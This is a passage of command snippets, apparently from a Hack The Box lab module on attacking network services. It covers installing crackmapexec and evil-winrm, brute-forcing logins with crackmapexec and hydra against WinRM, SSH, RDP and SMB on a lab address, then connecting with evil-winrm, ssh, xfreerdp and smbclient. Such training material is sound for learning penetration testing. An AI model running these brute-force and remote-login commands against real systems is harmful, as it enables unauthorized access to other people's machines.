...
```
frank-106@htb[/htb]$ sudo apt-get -y install crackmapexec
```
...
```shell-session
frank-106@htb[/htb]$  crackmapexec -h
...
```shell-session
frank-106@htb[/htb]$ crackmapexec smb -h
...
```shell-session
frank-106@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```shell-session
frank-106@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list
...
```shell-session
frank-106@htb[/htb]$ sudo gem install evil-winrm
...
```shell-session
frank-106@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

```shell-session
frank-106@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
...
```shell-session
frank-106@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
...
```shell-session
frank-106@htb[/htb]$ ssh user@10.129.42.197
...
```shell-session
frank-106@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
...
```shell-session
frank-106@htb[/htb]$ xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

Network Services

```shell-session
frank-106@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password
...
```shell-session
frank-106@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
...
```shell-session
frank-106@htb[/htb]$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
...
```shell-session
frank-106@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
